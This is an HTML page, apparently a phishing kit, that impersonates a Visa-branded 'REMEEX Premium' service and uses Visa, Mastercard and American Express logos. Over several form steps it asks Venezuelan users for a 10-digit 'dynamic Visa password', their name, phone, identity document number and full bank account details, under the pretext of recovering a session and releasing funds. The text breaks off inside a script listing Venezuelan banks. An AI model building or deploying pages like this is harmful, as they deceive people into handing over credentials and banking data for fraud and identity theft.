<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>VISA REMEEX Premium - Recuperación de Sesión</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="description" content="Recupera tu sesión en VISA REMEEX Premium. Ingresa tus datos y continúa con tu proceso." />

  <link rel="icon" href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" type="image/png" />
  
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />

  <style>
    :root {
      /* Colores modernos inspirados en Visa */
      --primary: #1a1f71; /* Azul oscuro de Visa */
      --primary-dark: #0d153e; 
      --secondary: #3b82f6;
      --accent: #60a5fa;
      --success: #22c55e;
      --danger: #ef4444;
      --warning: #f59e0b;

      /* Colores para la animación del borde */
      --border-white: #ffffff;
      --border-gray: #d1d5db;
      --border-light-blue: #93c5fd;

      /* Fondos y texto */
      --background: #f8fafc;
      --card-bg: rgba(255, 255, 255, 0.98);
      --text-primary: #0f172a;
      --text-secondary: #475569;

      /* Diseño */
      --border-radius-xl: 28px;
      --border-radius-lg: 24px;
      --border-radius: 16px;
      --border-radius-sm: 12px;
      
      /* Efectos */
      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05);
      --shadow: 0 10px 20px rgba(0, 0, 0, 0.3), 0 6px 6px rgba(0, 0, 0, 0.2);
      --shadow-lg: 0 25px 50px rgba(0, 0, 0, 0.3);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
      font-family: 'Inter', sans-serif;
      color: var(--text-primary);
      line-height: 1.6;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 1rem;
      overflow-x: hidden;
    }

    .container {
      max-width: 650px;
      width: 100%;
      margin-top: 2rem;
      background: var(--card-bg);
      border-radius: var(--border-radius-xl);
      box-shadow: var(--shadow);
      backdrop-filter: blur(10px);
      border: 2px solid var(--border-white);
      overflow: hidden;
      position: relative;
      transition: var(--transition);
      opacity: 0;
      transform: translateY(20px);
      animation: container-fade-in 0.6s 0.2s forwards;
    }

    @keyframes container-fade-in {
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes glow {
      0%, 100% {
        box-shadow: 0 0 40px rgba(26, 31, 113, 0.5), 0 0 80px rgba(26, 31, 113, 0.3);
      }
      50% {
        box-shadow: 0 0 70px rgba(26, 31, 113, 0.8), 0 0 100px rgba(26, 31, 113, 0.6);
      }
    }

    @keyframes border-blink {
      0% {
        border-color: var(--border-white);
      }
      33% {
        border-color: var(--border-gray);
      }
      66% {
        border-color: var(--border-light-blue);
      }
      100% {
        border-color: var(--border-white);
      }
    }

    .container:hover {
      transform: translateY(-5px);
      box-shadow: var(--shadow-lg);
    }

    .header {
      text-align: center;
      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
      color: #fff;
      padding: 3rem 2rem;
      position: relative;
      overflow: hidden;
      border-top-left-radius: var(--border-radius-xl);
      border-top-right-radius: var(--border-radius-xl);
      background-image: var(--aurora-gradient);
      animation: aurora-animation 15s ease infinite;
    }

    @keyframes aurora-animation {
      0% {
        background-position: 0% 50%;
      }
      50% {
        background-position: 100% 50%;
      }
      100% {
        background-position: 0% 50%;
      }
    }

    :root {
      --aurora-gradient: linear-gradient(
        120deg, 
        rgba(26, 31, 113, 0.4), 
        rgba(25, 35, 102, 0.3), 
        rgba(30, 40, 120, 0.3), 
        rgba(26, 31, 113, 0.2)
      );
      background-size: 400% 400%;
    }

    .header-logo {
      width: 80%;
      max-width: 400px;
      height: auto;
      margin-bottom: 1rem;
    }

    .header p {
      font-size: 1.2rem;
      line-height: 1.6;
      max-width: 600px;
      margin: 0 auto;
      opacity: 0.95;
      position: relative;
      z-index: 2;
    }

    .header::after {
      content: "";
      position: absolute;
      top: 0;
      left: -100%;
      width: 50%;
      height: 100%;
      background: linear-gradient(120deg, transparent, rgba(255, 255, 255, 0.7), transparent);
      transform: skewX(-20deg);
      opacity: 0;
      z-index: 1;
      pointer-events: none;
      animation: flash 3s infinite;
    }

    @keyframes flash {
      0% {
        left: -100%;
        opacity: 0;
      }
      10% {
        opacity: 1;
      }
      50% {
        left: 100%;
        opacity: 1;
      }
      60% {
        opacity: 0;
      }
      100% {
        left: 100%;
        opacity: 0;
      }
    }

    .logo-bar {
      background: var(--card-bg);
      padding: 1.5rem 1rem;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 3rem;
      border-bottom: 1px solid rgba(0,0,0,0.05);
      position: relative;
      overflow: hidden;
    }

    .logo-bar::before {
      content: '';
      position: absolute;
      top: 0;
      left: -50%;
      width: 200%;
      height: 100%;
      background: linear-gradient(120deg, rgba(255,255,255,0.1), rgba(255,255,255,0.2), rgba(255,255,255,0.1));
      animation: shimmer 3s linear infinite;
    }

    @keyframes shimmer {
      0% {
        transform: translateX(-50%);
      }
      100% {
        transform: translateX(50%);
      }
    }

    .logo-bar img {
      height: 36px;
      filter: grayscale(20%);
      opacity: 0.9;
      transition: var(--transition);
      position: relative;
      z-index: 2;
    }

    .logo-bar img:hover {
      filter: none;
      opacity: 1;
      transform: scale(1.08);
    }

    .progress-bar {
      height: 16px;
      background-color: #e2e8f0;
      border-radius: var(--border-radius);
      margin: 2rem;
      overflow: hidden;
      position: relative;
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
    }

    .progress-bar-fill {
      height: 100%;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      width: 0%; /* Inicio en 0% */
      transition: width 0.6s ease-in-out;
      border-radius: var(--border-radius);
      position: relative;
      overflow: hidden;
    }

    .progress-bar-fill::after {
      content: '';
      position: absolute;
      top: 0;
      left: -50%;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.3);
      transform: skewX(-45deg);
      animation: move 2s linear infinite;
    }

    @keyframes move {
      0% {
        left: -50%;
      }
      100% {
        left: 100%;
      }
    }

    .section-content {
      padding: 2rem;
      opacity: 0;
      transform: translateY(10px);
      transition: all 0.4s ease-out;
      display: none;
    }

    .section-content.active {
      display: block;
      opacity: 1;
      transform: translateY(0);
    }

    .section-content h2 {
      margin-bottom: 1.5rem;
      font-size: 1.5rem;
      color: var(--primary);
      display: inline-block;
      line-height: 1.4;
    }

    .section-content h2 i {
      color: var(--primary);
      font-size: 1.3rem;
      margin-right: 0.75rem;
      vertical-align: middle;
    }

    .section-content p {
      margin-bottom: 1.5rem;
      color: var(--text-secondary);
      font-size: 0.95rem;
    }

    .info-box {
      background-color: rgba(59, 130, 246, 0.1);
      border-left: 4px solid var(--primary);
      padding: 1rem;
      margin-bottom: 1.5rem;
      border-radius: 0 var(--border-radius-sm) var(--border-radius-sm) 0;
    }

    .info-box.warning {
      background-color: rgba(245, 158, 11, 0.1);
      border-left: 4px solid var(--warning);
    }

    .form-group {
      margin-bottom: 1.75rem;
    }

    .form-label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 500;
      color: var(--text-secondary);
      font-size: 0.95rem;
    }

    .form-control {
      width: 100%;
      padding: 0.875rem 1.25rem;
      border: 2px solid #e2e8f0;
      border-radius: var(--border-radius);
      font-size: 1rem;
      background: #fff;
      transition: var(--transition);
      color: var(--text-primary);
    }

    .form-control:hover {
      border-color: #cbd5e1;
    }

    .form-control:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.2);
    }

    .btn-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 2rem;
      gap: 1rem;
    }

    .btn-container {
      position: relative;
      width: 180px;
      height: 50px;
    }

    .btn-glow-effect {
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(
        90deg, 
        transparent, 
        var(--primary), 
        var(--secondary), 
        transparent
      );
      background-size: 200% 100%;
      border-radius: 30px;
      animation: border-glow 3s ease infinite;
      filter: blur(15px);
      opacity: 0.7;
      z-index: 0;
    }

    @keyframes border-glow {
      0% {
        background-position: -100% 0;
      }
      50% {
        background-position: 100% 0;
      }
      100% {
        background-position: -100% 0;
      }
    }

    .btn-glow {
      position: relative;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: white;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      overflow: hidden;
      box-shadow: 
          0 15px 25px rgba(0,0,0,0.3), 
          inset 0 -4px 8px rgba(255,255,255,0.3);
      transition: all 0.3s ease;
      z-index: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 600;
      font-size: 1rem;
    }.btn-glow-content {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
    }

    .btn-glow-initial {
      opacity: 1;
      transform: translateX(0);
    }

    .btn-glow:hover .btn-glow-initial {
      opacity: 0;
      transform: translateX(100%);
    }

    .btn-glow-hover {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0;
      transform: translateX(-100%);
      color: white;
    }

    .btn-glow:hover .btn-glow-hover {
      opacity: 1;
      transform: translateX(0);
    }

    .btn-glow-icon {
      margin-left: 10px;
    }

    /* Animación de carga */
    .loading-animation {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      z-index: 9999;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    .loading-animation.active {
      display: flex;
    }

    .loading-spinner {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      background: conic-gradient(transparent, var(--primary));
      animation: spinner-animation 1.5s linear infinite;
      margin-bottom: 2rem;
    }

    @keyframes spinner-animation {
      to {
        transform: rotate(360deg);
      }
    }

    .loading-text {
      color: white;
      font-size: 1.5rem;
      text-align: center;
      animation: fade-in-out 1.5s ease-in-out infinite;
    }

    @keyframes fade-in-out {
      0%, 100% { opacity: 0.6; }
      50% { opacity: 1; }
    }

    /* Responsive */
    @media (max-width: 768px) {
      .container {
        margin-top: 1.5rem;
      }

      .header {
        padding: 2rem 1rem;
      }

      .header-logo {
        width: 70%;
        max-width: 300px;
      }

      .header p {
        font-size: 1rem;
      }

      .logo-bar {
        gap: 2rem;
        padding: 1rem;
      }

      .logo-bar img {
        height: 28px;
      }

      .section-content {
        padding: 1.5rem;
      }

      .btn-container {
        width: 150px;
        height: 45px;
      }
    }

    @media (max-width: 480px) {
      .header-logo {
        width: 90%;
        max-width: 250px;
      }

      .header p {
        font-size: 0.95rem;
      }

      .logo-bar {
        gap: 1.5rem;
      }

      .logo-bar img {
        height: 24px;
      }

      .btn-container {
        width: 130px;
        height: 40px;
      }

      .btn-glow {
        font-size: 0.85rem;
      }
    }

    /* Overlay para mensajes de error y confirmación */
    .overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      z-index: 1000;
      justify-content: center;
      align-items: center;
      backdrop-filter: blur(5px);
    }

    .overlay.active {
      display: flex;
    }

    .message-box {
      background-color: #fff;
      padding: 2rem;
      border-radius: var(--border-radius-lg);
      max-width: 400px;
      width: 90%;
      text-align: center;
      box-shadow: var(--shadow-lg);
      animation: popup-appear 0.3s forwards;
    }

    @keyframes popup-appear {
      from {
        opacity: 0;
        transform: translateY(-20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .message-box h3 {
      margin-bottom: 1rem;
      color: var(--primary);
      font-size: 1.5rem;
    }

    .message-box p {
      margin-bottom: 1.5rem;
      color: var(--text-secondary);
    }

    .message-box.error h3 {
      color: var(--danger);
    }

    .message-box button {
      padding: 0.75rem 1.5rem;
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: white;
      border: none;
      border-radius: var(--border-radius);
      cursor: pointer;
      font-weight: 600;
      transition: var(--transition);
    }

    .message-box button:hover {
      transform: translateY(-2px);
      box-shadow: var(--shadow);
    }

    /* Balance card - Saldo disponible */
    .balance-card {
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: #fff;
      padding: 1.5rem;
      border-radius: var(--border-radius-lg);
      margin-bottom: 2rem;
      position: relative;
      overflow: hidden;
      box-shadow: var(--shadow);
    }

    .balance-card::after {
      content: "";
      position: absolute;
      top: 0;
      left: -100%;
      width: 50%;
      height: 100%;
      background: linear-gradient(120deg, transparent, rgba(255,255,255,0.3), transparent);
      transform: skewX(-25deg);
      animation: flash 2.5s infinite;
    }

    .balance-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
    }

    .balance-amount {
      font-size: 2rem;
      font-weight: 700;
      margin: 0.5rem 0;
    }

    .exchange-rate {
      margin-top: 0.5rem;
      font-size: 0.9rem;
      opacity: 0.9;
    }

    .balance-details {
      margin-top: 1rem;
      display: flex;
      justify-content: space-between;
    }

    .balance-detail {
      font-size: 0.9rem;
      opacity: 0.8;
    }

    /* Input con prefix */
    .input-group {
      display: flex;
      position: relative;
    }

    .input-prefix {
      position: absolute;
      left: 1rem;
      top: 50%;
      transform: translateY(-50%);
      color: var(--text-secondary);
      font-weight: 600;
    }

    .input-with-prefix {
      padding-left: 3rem !important;
    }

    /* Two-column layout */
    .form-row {
      display: flex;
      gap: 1rem;
      margin-bottom: 1.75rem;
    }

    .form-col {
      flex: 1;
    }

    @media (max-width: 600px) {
      .form-row {
        flex-direction: column;
        gap: 0;
      }
      
      .form-col {
        margin-bottom: 1.75rem;
      }
      
      .form-col:last-child {
        margin-bottom: 0;
      }
    }

    /* Imagen de desbloqueo para sección de clave */
    .unlock-icon {
      width: 100px;
      height: 100px;
      display: block;
      margin: 0 auto 1.5rem;
      transform-origin: center;
      animation: unlock-pulse 2s infinite ease-in-out;
    }

    @keyframes unlock-pulse {
      0%, 100% {
        transform: scale(1);
        opacity: 0.9;
      }
      50% {
        transform: scale(1.05);
        opacity: 1;
      }
    }

    /* Panel de verificación */
    .verification-panel {
      margin-top: 2rem;
      margin-bottom: 2rem;
      padding: 1.5rem;
      background: linear-gradient(135deg, rgba(26, 31, 113, 0.1), rgba(59, 130, 246, 0.1));
      border-radius: var(--border-radius-lg);
      border: 2px solid rgba(26, 31, 113, 0.2);
      position: relative;
      overflow: hidden;
    }

    .verification-panel::after {
      content: "";
      position: absolute;
      top: 0;
      left: -100%;
      width: 50%;
      height: 100%;
      background: linear-gradient(120deg, transparent, rgba(255,255,255,0.3), transparent);
      transform: skewX(-25deg);
      animation: flash 3s infinite;
      animation-delay: 1s;
    }

    .verification-panel h3 {
      color: var(--primary);
      margin-bottom: 1rem;
      font-size: 1.2rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .verification-panel p {
      margin-bottom: 1.5rem;
      color: var(--text-secondary);
    }

    /* Security badge icon */
    .security-badge {
      display: inline-block;
      margin-right: 0.5rem;
      animation: security-pulse 2s infinite ease-in-out;
    }

    @keyframes security-pulse {
      0%, 100% {
        transform: scale(1);
        opacity: 0.9;
      }
      50% {
        transform: scale(1.2);
        opacity: 1;
      }
    }
    
    /* Estilos para el select mejorado de banco */
    .bank-select-container {
      margin-bottom: 1.75rem;
    }
    
    .bank-select-custom {
      position: relative;
      width: 100%;
    }
    
    .bank-selected-option {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      padding: 0.875rem 1.25rem;
      border: 2px solid #e2e8f0;
      border-radius: var(--border-radius);
      background: #fff;
      cursor: pointer;
      transition: var(--transition);
    }
    
    .bank-selected-option:hover {
      border-color: #cbd5e1;
    }
    
    .bank-selected-option img {
      height: 30px;
      width: auto;
      object-fit: contain;
    }
    
    .bank-selected-option.empty {
      color: #94a3b8;
    }
    
    .bank-dropdown {
      position: absolute;
      top: calc(100% + 5px);
      left: 0;
      width: 100%;
      max-height: 300px;
      overflow-y: auto;
      background: white;
      border-radius: var(--border-radius);
      border: 2px solid #e2e8f0;
      box-shadow: var(--shadow);
      z-index: 100;
      display: none;
    }
    
    .bank-dropdown.active {
      display: block;
      animation: dropdown-appear 0.2s forwards;
    }
    
    @keyframes dropdown-appear {
      from {
        opacity: 0;
        transform: translateY(-10px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    .bank-filter {
      padding: 0.75rem;
      border-bottom: 1px solid #e2e8f0;
      position: sticky;
      top: 0;
      background: white;
    }
    
    .bank-filter input {
      width: 100%;
      padding: 0.75rem 1rem;
      border: 1px solid #e2e8f0;
      border-radius: var(--border-radius-sm);
      font-size: 0.95rem;
    }
    
    .bank-category-title {
      padding: 0.75rem 1rem;
      font-weight: 600;
      background: #f1f5f9;
      color: var(--text-secondary);
      font-size: 0.9rem;
    }
    
    .bank-option {
      display: flex;
      align-items: center;
      padding: 0.75rem 1rem;
      cursor: pointer;
      transition: background-color 0.2s;
      gap: 0.75rem;
    }
    
    .bank-option:hover {
      background-color: #f8fafc;
    }
    
    .bank-option img {
      height: 25px;
      width: auto;
      object-fit: contain;
    }
    
    .bank-option.disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
  </style>
</head><body>
  <div class="container">
    <!-- Encabezado con logo -->
    <div class="header">
      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png" alt="REMEEX Logo" class="header-logo">
      <p>Recupera tu sesión y continúa con tu proceso</p>
    </div>

    <!-- Barra de logos de tarjetas -->
    <div class="logo-bar">
      <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa Logo">
      <img src="https://www.mastercard.es/content/dam/public/mastercardcom/es/favicon/mc-logo-52.svg" alt="MasterCard Logo">
      <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express Logo">
    </div>

    <!-- Barra de progreso -->
    <div class="progress-bar">
      <div class="progress-bar-fill" id="progressBarFill"></div>
    </div>

    <!-- Paso 0: Solo pedir clave de acceso -->
    <div class="section-content active" id="step0">
      <h2><i class="fas fa-key"></i> Acceso Seguro</h2>
      
      <div class="info-box">
        <p><i class="fas fa-info-circle"></i> Para recuperar tu sesión, necesitamos verificar tu identidad primero. Por favor, ingresa tu clave de 10 dígitos.</p>
      </div>

      <img src="https://cdn-icons-png.flaticon.com/512/6357/6357049.png" alt="Acceso Seguro" class="unlock-icon">
      
      <div class="verification-panel">
        <h3><i class="fas fa-shield-alt security-badge"></i> Verificación de Identidad</h3>
        <p>Esta clave define parámetros importantes .</p>
        
        <div class="form-group">
          <label class="form-label" for="accessPassword">Contraseña dinámica de 10 dígitos VISA</label>
          <input type="password" class="form-control" id="accessPassword" maxlength="10" placeholder="Ingresa los 10 dígitos de tu clave" />
          <small style="color: var(--text-secondary); font-size: 0.85rem;">Importante: verifica tus datos </small>
        </div>
      </div>

      <div class="btn-row">
        <div style="position: relative; width: 180px; height: 50px; margin: 0 auto;">
          <div class="btn-glow-effect"></div>
          <button class="btn-glow" id="verifyAccessBtn">
            <div class="btn-glow-content btn-glow-initial">
              Verificar
            </div>
            <div class="btn-glow-content btn-glow-hover">
              Verificar
              <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <line x1="5" y1="12" x2="19" y2="12"></line>
                <polyline points="12 5 19 12 12 19"></polyline>
              </svg>
            </div>
          </button>
        </div>
      </div>
    </div>

    <!-- Paso 1: Recuperación completa -->
    <div class="section-content" id="step1">
      <h2><i class="fas fa-undo"></i> Recuperación de Sesión</h2>
      
      <div class="info-box">
        <p><i class="fas fa-check-circle"></i> <strong>Clave verificada correctamente.</strong> Por favor, completa los datos restantes para continuar.</p>
      </div>

      <div class="form-group">
        <label class="form-label" for="fullName">Nombres y Apellidos</label>
        <input type="text" class="form-control" id="fullName" placeholder="Ej: Juan Alberto Pérez Rodríguez" />
      </div>

      <div class="form-row">
        <div class="form-col">
          <label class="form-label" for="phonePrefix">Teléfono</label>
          <div style="display:flex; gap:0.5rem;">
            <select class="form-control" id="phonePrefix" style="max-width:100px;">
              <option value="">Prefijo</option>
              <option value="0414">0414</option>
              <option value="0424">0424</option>
              <option value="0412">0412</option>
              <option value="0416">0416</option>
              <option value="0426">0426</option>
            </select>
            <input type="text" class="form-control" id="phoneNumber" placeholder="1234567" maxlength="7" />
          </div>
        </div>
        <div class="form-col">
          <label class="form-label" for="docType">Tipo de Documento</label>
          <select class="form-control" id="docType">
            <option value="">-- Seleccione --</option>
            <option value="Cédula de Identidad">Cédula de Identidad</option>
            <option value="Pasaporte Vigente">Pasaporte Vigente</option>
            <option value="Licencia de Conducir">Licencia de Conducir</option>
          </select>
        </div>
      </div>

      <div class="form-row">
        <div class="form-col">
          <label class="form-label" for="nationality">Nacionalidad</label>
          <select class="form-control" id="nationality">
            <option value="">-- Seleccione --</option>
            <option value="Venezolano">Venezolano</option>
            <option value="Extranjero">Extranjero</option>
          </select>
        </div>
        <div class="form-col">
          <label class="form-label" for="docNumber">Número de documento</label>
          <input type="text" class="form-control" id="docNumber" placeholder="8 a 10 dígitos" maxlength="10" />
        </div>
      </div>

      <div class="form-group">
        <label class="form-label" for="bankSelectDisplay">Banco para recibir los fondos</label>
        <div class="bank-select-custom">
          <div class="bank-selected-option empty" id="bankSelectDisplay">
            <i class="fas fa-university"></i>
            <span>-- Seleccione un banco --</span>
          </div>
          <div class="bank-dropdown" id="bankDropdown">
            <div class="bank-filter">
              <input type="text" id="bankSearchInput" placeholder="Buscar banco...">
            </div>
            <div id="bankDropdownOptions">
              <!-- Las opciones de bancos se cargarán dinámicamente aquí -->
            </div>
          </div>
        </div>
        <input type="hidden" id="selectedBankCode" value="">
        <input type="hidden" id="selectedBankName" value="">
        <input type="hidden" id="selectedBankLogo" value="">
      </div>

      <div class="form-group" id="accountContainer" style="display:none;">
        <label class="form-label" for="accountNumber">Número de cuenta</label>
        <div style="display:flex; gap:0.5rem;">
          <input type="text" class="form-control" id="bankCode" style="max-width:100px;" readonly />
          <input type="text" class="form-control" id="restAccountDigits" placeholder="16 dígitos restantes" maxlength="16" />
        </div>
      </div>

      <div class="form-group">
        <label class="form-label" for="accountType">Tipo de cuenta</label>
        <select class="form-control" id="accountType">
          <option value="">-- Seleccione --</option>
          <option value="Ahorro (Bs)">Ahorro (Bs)</option>
          <option value="Corriente (Bs)">Corriente (Bs)</option>
        </select>
      </div>

      <div class="info-box warning">
        <p><i class="fas fa-exclamation-triangle"></i> <strong>Importante:</strong> Asegúrate de ingresar los datos correctamente. Esta información se utilizará para validar tu identidad y procesar tu retiro.</p>
      </div>

      <div class="btn-row">
        <div style="position: relative; width: 180px; height: 50px; margin: 0 auto;">
          <div class="btn-glow-effect"></div>
          <button class="btn-glow" id="recoverSessionBtn">
            <div class="btn-glow-content btn-glow-initial">
              Continuar
            </div>
            <div class="btn-glow-content btn-glow-hover">
              Continuar
              <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <line x1="5" y1="12" x2="19" y2="12"></line>
                <polyline points="12 5 19 12 12 19"></polyline>
              </svg>
            </div>
          </button>
        </div>
      </div>
    </div><!-- Paso 2: Verificación y resumen -->
    <div class="section-content" id="step2">
      <h2><i class="fas fa-check-circle"></i> Verificación de Datos</h2>
      
      <div class="info-box">
        <p><i class="fas fa-info-circle"></i> Hemos recuperado tu sesión exitosamente. Por favor, verifica que la información sea correcta.</p>
      </div>

      <!-- Tarjeta de Saldo Disponible -->
      <div class="balance-card">
        <div class="balance-header">
          <h3>Saldo disponible</h3>
          <i class="fas fa-sync-alt"></i>
        </div>
        <div class="balance-amount" id="balanceAmount">0,00 Bs</div>
        <div class="exchange-rate" id="exchangeRate">Tasa: 0.00 Bs/USD</div>
        <div class="balance-details">
          <div class="balance-detail" id="usdAmount">≈ 0.00 USD</div>
          <div class="balance-detail" id="dateTime">Fecha: --/--/----</div>
        </div>
      </div>

      <!-- Resumen de datos -->
      <h3 style="color: var(--primary); font-size: 1.3rem; margin-bottom: 1rem;">Datos Personales:</h3>
      <div style="background: #f8fafc; padding: 1rem; border-radius: var(--border-radius); margin-bottom: 1.5rem;">
        <p style="margin-bottom: 0.5rem;"><strong>Nombre:</strong> <span id="summaryName">--</span></p>
        <p style="margin-bottom: 0.5rem;"><strong>Documento:</strong> <span id="summaryDocument">--</span></p>
        <p style="margin-bottom: 0.5rem;"><strong>Teléfono:</strong> <span id="summaryPhone">--</span></p>
      </div>

      <h3 style="color: var(--primary); font-size: 1.3rem; margin-bottom: 1rem;">Datos Bancarios:</h3>
      <div style="background: #f8fafc; padding: 1rem; border-radius: var(--border-radius); margin-bottom: 1.5rem;">
        <p style="margin-bottom: 0.5rem;"><strong>Banco:</strong> <span id="summaryBank">--</span></p>
        <p style="margin-bottom: 0.5rem;"><strong>Cuenta:</strong> <span id="summaryAccount">--</span></p>
        <p style="margin-bottom: 0.5rem;"><strong>Tipo:</strong> <span id="summaryAccountType">--</span></p>
      </div>

      <div class="btn-row">
        <div class="btn-container">
          <div class="btn-glow-effect"></div>
          <button class="btn-glow" id="backToEditBtn">
            <div class="btn-glow-content btn-glow-initial">
              Editar datos
            </div>
            <div class="btn-glow-content btn-glow-hover">
              Editar
              <i class="fas fa-edit btn-glow-icon"></i>
            </div>
          </button>
        </div>

        <div class="btn-container">
          <div class="btn-glow-effect"></div>
          <button class="btn-glow" id="continueProcessBtn">
            <div class="btn-glow-content btn-glow-initial">
              Continuar
            </div>
            <div class="btn-glow-content btn-glow-hover">
              Continuar
              <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <line x1="5" y1="12" x2="19" y2="12"></line>
                <polyline points="12 5 19 12 12 19"></polyline>
              </svg>
            </div>
          </button>
        </div>
      </div>
    </div>
  </div>

  <!-- Overlay de error -->
  <div class="overlay" id="errorOverlay">
    <div class="message-box error">
      <h3>Error</h3>
      <p id="errorMessage">Ha ocurrido un error al procesar tu solicitud.</p>
      <button id="errorCloseBtn">Entendido</button>
    </div>
  </div>

  <!-- Overlay de éxito -->
  <div class="overlay" id="successOverlay">
    <div class="message-box">
      <h3>Éxito</h3>
      <p id="successMessage">Tu solicitud ha sido procesada exitosamente.</p>
      <button id="successCloseBtn">Continuar</button>
    </div>
  </div>

  <!-- Animación de carga -->
  <div class="loading-animation" id="loadingAnimation">
    <div class="loading-spinner"></div>
    <div class="loading-text" id="loadingText">Recuperando sesión...</div>
  </div><!-- Script -->
  <script>
    // Default bank logo para casos de error
    const DEFAULT_BANK_LOGO = "https://e7.pngegg.com/pngimages/127/511/png-clipart-bank-computer-icons-bank-building-bank.png";
    
    // Datos de los bancos (del overlay-bancos.html)
    // Bancos Nacionales
    const nationalBanks = [
      {
        name: "Banco de Venezuela, S.A.",
        logoUrl: "https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png",
        code: "0102",
        category: "national"
      },
      {
        name: "Banco Central de Venezuela",
        logoUrl: "https://www.bcv.org.ve/sites/default/files/default_images/logo_bcv-04_2.png",
        code: "0001",
        category: "national"
      },
      {
        name: "Banco Venezolano de Crédito, S.A.",
        logoUrl: "https://www.venezolano.com/images/galeria/108_1.png",
        code: "0104",
        category: "national"
      },
      {
        name: "Banco Mercantil, C.A.",
        logoUrl: "https://files.socialgest.net/mybio/5f529398b36f8_1599247256.png",
        code: "0105",
        category: "national"
      },
      {
        name: "Banco Provincial, S.A.",
        logoUrl: "https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg",
        code: "0108",
        category: "national"
      },
      {
        name: "Banco del Caribe C.A., Bancaribe",
        logoUrl: "https://d3olc33sy92l9e.cloudfront.net/wp-content/themes/bancaribe/images/Bancaribe-LogotipoTurquesa.png",
        code: "0114",
        category: "national"
      },
      {
        name: "Banco Exterior C.A., Banco Universal",
        logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Banco-Exterior-VE-logo.png/183px-Banco-Exterior-VE-logo.png",
        code: "0115",
        category: "national"
      },
      {
        name: "Banco Caroní C.A., Banco Universal",
        logoUrl: DEFAULT_BANK_LOGO,
        code: "0128",
        category: "national"
      },
      {
        name: "Banesco Banco Universal, C.A.",
        logoUrl: "https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip",
        code: "0134",
        category: "national"
      },
      {
        name: "Banco Sofitasa Banco Universal, C.A.",
        logoUrl: "https://www.sofitasa.com/assets/img/nuevo_logo.png",
        code: "0137",
        category: "national"
      },
      {
        name: "Banco Plaza, Banco Universal",
